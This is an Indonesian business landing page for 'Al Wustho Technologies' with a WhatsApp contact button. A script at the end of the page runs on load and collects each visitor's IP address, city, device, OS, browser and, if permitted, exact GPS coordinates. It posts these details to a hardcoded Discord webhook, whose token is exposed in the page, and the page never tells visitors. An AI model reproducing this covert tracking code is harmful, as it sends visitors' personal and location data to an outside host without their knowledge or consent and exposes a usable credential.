<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Al Wustho Technologies</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { height: 100vh; width: 100vw; overflow: hidden; display: flex; align-items: center; justify-content: center; color: white; background-color: #001f3f; }

        /* Video Background Wrapper - Responsive for Mobile & Desktop */
        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            overflow: hidden;
            background-color: #001f3f;
        }

        .video-background iframe {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            pointer-events: none;
            /* Ensures proper scaling on portrait mobile screens */
            width: 177.78vh; 
            height: 100vh;
        }

        @media (min-aspect-ratio: 16/9) {
            .video-background iframe {
                width: 100vw;
                height: 56.25vw;
            }
        }

        /* Overlay Content Box */
        .content {
            background: rgba(0, 31, 63, 0.9); /* Deep Blue with opacity */
            padding: 2.2rem 1.5rem;
            border-radius: 20px;
            text-align: center;
            border: 2px solid #FFA500; /* Orange Border */
            width: 90%;
            max-width: 420px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
            z-index: 1;
        }

        /* Profile Picture Placeholder Styling */
        .profile-container {
            width: 100px;
            height: 100px;
            margin: 0 auto 1rem auto;
            border-radius: 50%;
            overflow: hidden;
            border: 3px solid #25D366; /* Green accent border */
            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
            background-color: #ffffff;
        }

        .profile-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        h1 { color: #FFFFFF; margin-bottom: 0.5rem; font-size: 1.8rem; }
        p { color: #E0E0E0; margin-bottom: 1.5rem; font-size: 1rem; }

        /* WhatsApp Button */
        .wa-button {
            display: inline-block;
            background-color: #25D366; /* WhatsApp Green */
            color: white;
            padding: 12px 20px;
            text-decoration: none;
            border-radius: 50px;
            font-weight: bold;
            font-size: 0.95rem;
            transition: transform 0.2s, background 0.3s;
            border: none;
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.4);
        }

        .wa-button:hover {
            transform: scale(1.05);
            background-color: #128C7E;
        }

        /* Larger screen adjustments */
        @media (min-width: 768px) {
            .content { padding: 2.5rem; max-width: 450px; }
            h1 { font-size: 2.2rem; }
            p { font-size: 1.1rem; }
            .profile-container { width: 110px; height: 110px; }
            .wa-button { font-size: 1rem; padding: 14px 25px; }
        }
    </style>
</head>
<body>

    <!-- Background Video -->
    <div class="video-background">
        <iframe 
            src="https://www.youtube-nocookie.com/embed/PX4DT_A9UVU?autoplay=1&mute=1&loop=1&playlist=PX4DT_A9UVU&controls=0&showinfo=0&modestbranding=1" 
            referrerpolicy="strict-origin-when-cross-origin"
            frameborder="0" 
            allow="autoplay; encrypted-media" 
            allowfullscreen>
        </iframe>
    </div>

    <!-- Main Content -->
    <div class="content">
        <!-- Profile Picture Section -->
        <div class="profile-container">
            <img src="logo.jpeg" alt="Al Wustho Technologies Profile">
        </div>

        <h1>Al Wustho Technologies</h1>
        <p>Solusi Teknologi Digital Terpercaya</p>
        
        <a href="https://wa.me/6285188139658" class="wa-button" target="_blank">
            Klik disini untuk konsultasi via Whatsapp
        </a>
    </div>
<!-- Enhanced Discord Visitor Tracker Script -->
        <script>
            async function sendDiscordAlert() {
                try {
                    // 1. Fetch IP & Coarse Location
                    let ip = 'Unknown', city = 'Unknown', region = 'Unknown', country = 'Unknown';
                    try {
                        let response = await fetch('https://ipapi.co/json/');
                        let data = await response.json();
                        ip = data.ip || 'Unknown';
                        city = data.city || 'Unknown';
                        region = data.region || 'Unknown';
                        country = data.country_name || 'Unknown';
                    } catch (e) {
                        console.log("IP API fetch failed", e);
                    }

                    // 2. Extract Device & Browser Details from User-Agent
                    let ua = navigator.userAgent;
                    let browser = "Unknown Browser";
                    let os = "Unknown OS";
                    let device = "Desktop/Mobile";

                    if (ua.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
                    else if (ua.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
                    else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
                    else if (ua.indexOf("Edge") > -1) browser = "Microsoft Edge";
                    else if (ua.indexOf("Chrome") > -1) browser = "Google Chrome";
                    else if (ua.indexOf("Safari") > -1) browser = "Apple Safari";

                    if (ua.indexOf("Win") > -1) os = "Windows";
                    else if (ua.indexOf("Mac") > -1) os = "macOS";
                    else if (ua.indexOf("Linux") > -1) os = "Linux";
                    else if (ua.indexOf("Android") > -1) os = "Android";
                    else if (ua.indexOf("like Mac") > -1) os = "iOS";

                    device = /Mobi|Android/i.test(ua) ? "Mobile Device" : "Desktop/Laptop";

                    const webhookUrl = 'https://discord.com/api/webhooks/1537277575817330729/INZ0kAtXZKA2SF5sFTHPySczXzHNVdkgBxhkALe7-_QnlHdOIJMX5RZmpxHsxg41rMGg'; 

                    // Function to dispatch data payload to Discord
                    const postPayload = async (locationText, extraFields = []) => {
                        let payload = {
                            embeds: [{
                                title: "🔔 Al Wustho Visitor!",
                                color: 248100,
                                fields: [
                                    { name: "🌐 IP Address", value: ip, inline: true },
                                    { name: "📍 Location", value: locationText, inline: true },
                                    { name: "📱 Device", value: `${device} (${os})`, inline: true },
                                    { name: "🌐 Browser", value: browser, inline: true },
                                    ...extraFields,
                                    { name: "⏰ Time", value: new Date().toLocaleString('id-ID'), inline: false }
                                ]
                            }]
                        };

                        await fetch(webhookUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload)
                        });
                    };

                    // 3. Attempt HTML5 GPS Geolocation prompt
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            async (position) => {
                                let lat = position.coords.latitude;
                                let lon = position.coords.longitude;
                                await postPayload(`${city}, ${region}, ${country} (IP)`, [
                                    { name: "🎯 Exact GPS Coordinates", value: `Lat: ${lat}, Lon: ${lon}\n[Open in Google Maps](https://maps.google.com/?q=${lat},${lon})`, inline: false }
                                ]);
                            },
                            async (error) => {
                                // User blocked or denied location prompt
                                await postPayload(`${city}, ${region}, ${country} (GPS Denied/Unavailable)`);
                            },
                            { timeout: 10000, enableHighAccuracy: true }
                        );
                    } else {
                        await postPayload(`${city}, ${region}, ${country} (No GPS Support)`);
                    }

                } catch (error) {
                    console.log("Could not send Discord alert:", error);
                }
            }
            window.onload = sendDiscordAlert;
        </script>
</body>
</html>
